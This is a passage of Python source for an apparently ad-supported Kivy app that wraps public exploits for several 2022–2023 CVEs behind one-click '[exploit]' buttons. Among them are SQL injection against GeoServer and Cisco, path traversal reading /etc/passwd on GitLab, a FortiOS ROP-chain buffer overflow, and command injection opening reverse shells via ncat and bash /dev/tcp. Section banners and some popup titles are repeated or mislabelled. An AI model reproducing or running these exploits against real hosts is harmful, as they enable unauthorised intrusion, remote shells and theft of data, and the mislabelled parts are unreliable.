            self.res = Button(text = f'Timeout on host {url}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {url}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################

    def CVE_2023_25157(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://www.google.com/ ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='GeoServer OGC Filter SQL Injection Vulnerabilities',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_25157)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_25157(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        URL = self.t.text
        PROXY_ENABLED = False
        PROXY = "http://127.0.0.1:8080/" if PROXY_ENABLED else None
        try:
            response = requests.get(URL + "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities", proxies={"http": PROXY}, verify=False)
            if response.status_code == 200:
                root = ET.fromstring(response.text)
                feature_types = root.findall('.//{http://www.opengis.net/wfs}FeatureType')
                names = [feature_type.findtext('{http://www.opengis.net/wfs}Name') for feature_type in feature_types]
                self.res = Button(text = f" Available feature names: ",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)

                for name in names:
                    print(f"- {name}")
                    self.res = Button(text = f"- {name}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                    self.layout.add_widget(self.res)

                cql_filters = ["strStartsWith"] # We can also exploit other filter/functions like "PropertyIsLike", "strEndsWith", "strStartsWith", "FeatureId", "jsonArrayContains", "DWithin" etc.
                for name in names:
                    for cql_filter in cql_filters:
                        endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&maxFeatures=1&outputFormat=json"
                        response = requests.get(URL + endpoint, proxies={"http": PROXY}, verify=False)
                        if response.status_code == 200:
                            json_data = json.loads(response.text)
                            properties = json_data['features'][0]['properties']
                            property_names = list(properties.keys())
                            self.res = Button(text = f"\n Available Properties for {name}: ",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                            self.layout.add_widget(self.res)
                            for property_name in property_names:
                                print(f"- {property_name}")
                                self.res = Button(text = f"- {property_name}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                                self.layout.add_widget(self.res)
                            self.res = Button(text = f"\n Sending requests for each property name: ",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                            self.layout.add_widget(self.res)
                
                            for property_name in property_names:
                                endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&CQL_FILTER={cql_filter}%28{property_name}%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+true"
                                response = requests.get(URL + endpoint, proxies={"http": PROXY}, verify=False)
                                self.res = Button(text = f"[+] Sending request for  {name} with Property  {property_name}  and CQL_FILTER:  {cql_filter} ",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                                self.layout.add_widget(self.res)
                                if response.status_code == 200:
                                    root = ET.fromstring(response.text)
                                    error_message = root.findtext('.//{http://www.opengis.net/ogc}ServiceException')
                                    self.res = Button(text = f"{error_message}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                                    self.layout.add_widget(self.res)
                                else:
                                    self.res = Button(text = f"Request failed",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                                    self.layout.add_widget(self.res)
                        else:
                            self.res = Button(text = f"Request failed",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                            self.layout.add_widget(self.res)
            else:
                self.res = Button(text = f"Failed to retrieve XML data",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
               # print(f"{RED}Failed to retrieve XML data{ENDC}")
        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {URL}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {URL}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2022_42475(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter domin ro ip ex.( www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='A heap-based buffer overflow vulnerability',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2022_42475)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2022_42475(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        target_host = self.t.text
        context = ssl.SSLContext()
        target_port = '443'
        reverse = '00007fc5f128e000'
        params = 'id'
        strparams = "["
        for param in params:
            strparams += "'"+param+"',"
        strparams = strparams[:-1]
        strparams += "]"
        execve = p64(0x0042e050)
        movrdirax = p64(0x00000000019d2196)# : mov rdi, rax ; call r13
        poprsi = p64(0x000000000042f0f8)# : pop rsi ; ret)
        poprdx = p64(0x000000000042f4a5)# : pop rdx ; ret)
        jmprax = p64(0x0000000000433181)#: jmp rax)
        pops = p64(0x000000000165cfd7)# : pop rdx ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret)
        poprax = p64(0x00000000004359af)# : pop rax ; ret)
        gadget1 = p64(0x0000000001697e0d); #0x0000000001697e0d : push rbx ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
        poprdi = p64(0x000000000042ed7e)# : pop rdi ; ret
        rax3 = gadget1
        hardcoded = 0x00007fc5f128e000
        scbase = p64(hardcoded)
        rdi = p64(hardcoded + 0xc48)
        cmd = p64(hardcoded + 0xd38)
        asdf = hardcoded + 0xd38
        cmd1 = p64(asdf)
        cmd2 = p64(asdf+16)
        arg1 = p64(asdf+48)
        arg2 = p64(asdf+56)
        arg3 = p64(asdf+64)
        ropchain = poprax
        ropchain += execve
        ropchain += poprdi
        ropchain += cmd1
        ropchain += poprsi
        ropchain += cmd2
        ropchain += poprdx
        ropchain += p64(0)
        ropchain += jmprax
        ropchain += b"/bin/python\x00\x00\x00\x00\x00"
        ropchain += arg1
        ropchain += arg2
        ropchain += arg3
        ropchain += p64(0)
        ropchain += b"python\x00\x00"
        ropchain += b"-c\x00\x00\x00\x00\x00\x00"
        ropchain += b"""import socket,sys,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('"""+ reverse.encode() + b"""',31337))\n[os.dup2(s.fileno(),x) for x in range(3)]\ni=os.fork()\nif i==0:\n os.execve('/bin/sh', """+strparams.encode()+b""",{})\n\x00\x00"""
        try:
            with socket.create_connection((target_host, int(target_port,10))) as sock:
                with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                    ssock.settimeout(2)
                    context.verify_mode = ssl.CERT_NONE
                    payload = b"A"*173096+rdi+poprdi+cmd+pops+b"A"*40+pops+rax3+b"C"*32+ropchain
                    tosend = b"POST /remote/error HTTP/1.1\r\nHost: "+target_host +b"\r\nContent-Length: 115964117980\r\n\r\n" + payload
                    ssock.sendall(tosend)
                    r = ssock.recv(10024)
                    self.res2 = TextInput(text = r ,font_size = 20,size_hint_y = None, height = 300)
                    self.layout.add_widget(self.res2)
    
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {target_host}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {target_host}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_0861(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='NetModule NSRW web administration interface executes an OS command constructed with \nunsanitized user input',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_0861)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_0861(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        url = self.t.text
        url = f'{url}/admin/gnss.php'
        c = {'PHPSESSID':''}
        try:
            response = requests.get(url,cookies=c)
            csrf_token = re.search(r'<input type="hidden" name="csrf-token" value="([^"]+)">', response.text)
            data = {
                'toggleAlignment': 'test',
                'device_id': f'1; {id} > /home/www-data/admin/img/nothing.png; 2',
                'csrf-token': csrf_token,
            }
            url = f'{url}/admin/gnssAutoAlign.php'
        
            response = requests.post(url, data=data,cookies=c)
            self.res1 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)
            if response.status_code == 200:
                results = requests.get(f'{url}/admin/img/nothing.png',cookies=c)
                self.res = Button(text = 'done!',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res1 = TextInput(text = results.content.decode() ,font_size = 20,size_hint_y = None, height = 300)
                self.layout.add_widget(self.res1)

        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {url}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {url}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)



##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_2825(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://www.google.com/ ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_2825)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_2825(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        ENDPOINT = self.t.text
        USERNAME = "root"
        PASSWORD = "toor"

        session = requests.Session()
        csrf_token = ""

        requests.urllib3.disable_warnings()


        def request(method, path, data=None, files=None, headers=None):
            global csrf_token

            if method == "POST" and isinstance(data, dict):
                data["authenticity_token"] = csrf_token

            response = session.request(method,f"{ENDPOINT}{path}",data=data,files=files, headers=headers, verify=False,)
            if response.status_code != 200:
                self.res = Button(text = f"[*] Request failed: {method} - {path} => {response.status_code}",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res1 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 300)
                self.layout.add_widget(self.res1)

            if response.headers["content-type"].startswith("text/html"):
                csrf_token = BeautifulSoup(response.text, "html.parser").find("meta", {"name": "csrf-token"})["content"]
            return response
        request("GET", "")
        self.res = Button(text = "[*] Attempting to login...",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)

        request("POST", "/users/sign_in",data={"user[login]": USERNAME, "user[password]": PASSWORD},)
        self.res = Button(text = f"[*] Login successful as user '{USERNAME}'",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)
        group_prefix = "".join(random.choices(string.ascii_uppercase + string.digits, k=3))
        self.res = Button(text = f"[*] Creating 11 groups with prefix {group_prefix}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)
        parent_id = ""
        for i in range(1, 12):

            name = f"{group_prefix}-{i}"
            create_resp = request( "POST", "/groups",data={ "group[parent_id]": parent_id,"group[name]": name,"group[path]": name, "group[visibility_level]": 20,"user[role]": "software_developer", "group[jobs_to_be_done]": "", },)

            parent_id = BeautifulSoup(create_resp.text, "html.parser").find("button", {"title": "Copy group ID"})["data-clipboard-text"]
            self.res = Button(text = f"[*] Created group '{name}'",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
 
        project_resp = request("POST","/projects",data={"project[ci_cd_only]": "false","project[name]": "CVE-2023-2825", "project[selected_namespace_id]": parent_id,"project[namespace_id]": parent_id, "project[path]": "CVE-2023-2825","project[visibility_level]": 20,"project[initialize_with_readme": 1,},)
        repo_path = urlparse(project_resp.url).path
        self.res = Button(text = f"[*] Created public repo '{repo_path}'",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)

        file_resp = request("POST",f"/{repo_path}/uploads",files={"file": "hello world"},headers={"X-CSRF-Token": csrf_token},)
        file_url = file_resp.json()["link"]["url"]
        self.res = Button(text = f"[*] Uploaded file '{file_url}'",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)

        exploit_path = f"/{repo_path}{file_url.split('file')[0]}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
        self.res = Button(text = f"[*] Executing exploit, fetching file '/etc/passwd': GET - {exploit_path}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)

        exploit_resp = request("GET", exploit_path)
        self.res = Button(text = f"\n{exploit_resp.text}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)


##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_20110(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter domin ex.( google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_20110)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_20110(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        host = self.t.text
        cookies = {"_lic_engine_session": "<COOKIE>", "XSRF-TOKEN": "<CSRFTOKEN>"}
        url = "https://" + host + "/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+'P%25')+THEN+0+ELSE+1+END)--%20&filter_val=a&offset=0&limit=10"
        headers = {"Accept": "application/json", "Content-Type": "application/json"}
        chars = string.printable[0:95]
        result = []
        search = True
        self.res = Button(text = "[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC\n",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)
        self.res = Button(text = "[+] Starting DBMS banner enumeration...\n",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res)
        try:
            while search:
                for char in chars:
                    url = "https://" + host + "/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+'" + ''.join(result) + char + "%25')+THEN+0+ELSE+1+END)--%20&filter_val=a&offset=0&limit=10"
                    with warnings.catch_warnings():
                        warnings.simplefilter("ignore")
                        r = requests.get(url, headers=headers, cookies=cookies, verify=False)
                    if "PG::DivisionByZero" in r.text:

                        result.append(char)
                        self.res = Button(text = "[+] DBMS Banner: \n",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                        self.layout.add_widget(self.res)
                        self.res1 = TextInput(text = join(result) ,font_size = 20,size_hint_y = None, height = 300)
                        self.layout.add_widget(self.res1)

                        break
                    if char == " ":
                        search = False
        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {host}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {host}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)


##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_20887(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_20887)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_20887(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        host = self.t.text
        attacker = "192.168.1.10:1337"
        def handler():
            self.re = Button(text = "(*) Starting handler",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.re)

            t = Telnet()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((attacker.split(":")[0],int(attacker.split(":")[1])))
            s.listen(1)
            conn, addr= s.accept()
            self.res = Button(text = f"(+) Received connection from {addr[0]}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
 
            t.sock = conn
            self.res2 = Button(text =  "(+) pop thy shell! (it's ready)",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res2)
 
            t.interact()

        def start_handler():
            t = Thread(target=handler)
            t.daemon = True
            t.start()


        def exploit():
            url = host + "/saas./resttosaasservlet"
            revshell = f'ncat {attacker.split(":")[0]} {attacker.split(":")[1]} -e /bin/sh'
            payload = """[1,"createSupportBundle",1,0,{"1":{"str":"1111"},"2":{"str":"`"""+revshell+"""`"},"3":{"str":"value3"},"4":{"lst":["str",2,"AAAA","BBBB"]}}]"""
            result = requests.post(url, headers={"Content-Type":"application/x-thrift"}, verify=False, data=payload)
        self.res12 = Button(text =  "VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.res12)
        start_handler()
        exploit()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            self.res10 = Button(text =  "(*) Exiting...",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res10)


##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_28771(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter domin ex.(  www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title =' execute some OS commands remotely by sending crafted packets to an affected device.',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_28771)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_28771(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        rhost = self.t.text
        lhost = '0.0.0.0'
        lport = '4444'
        try:
            load_contrib('ikev2')
            cmd = "\";bash -c \"exec bash -i &>/dev/tcp/" + lhost + "/" + lport + " <&1;\";echo -n \""
            packet = IP(dst = rhost) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = 'Notify', exch_type = 'IKE_SA_INIT', flags='Initiator') /IKEv2_payload_Notify(next_payload = 'Nonce', type = 14, load = "HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB" + cmd) / IKEv2_payload_Nonce(next_payload = 'None', load = RandString(68))
            send(packet)
            self.res = Button(text = "don send ",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {rhost}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {rhost}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_24488(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.(  https://www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_24488)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_24488(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        url = self.t.text
        try:
            def check_cve_2023_24488(url):
                path = "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
                response = requests.get(url + path)

                if ("<script>alert(document.domain)</script>" in response.text and
                    "content-type: text/html" in response.headers.get("Content-Type", "").lower() and
                    response.status_code == 302):
                    return True
                return False

            if check_cve_2023_24488(url):
                self.res = Button(text = "Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
 
            else:
                self.res = Button(text = "Not vulnerable to CVE-2023-24488",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
 
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {url}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {url}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
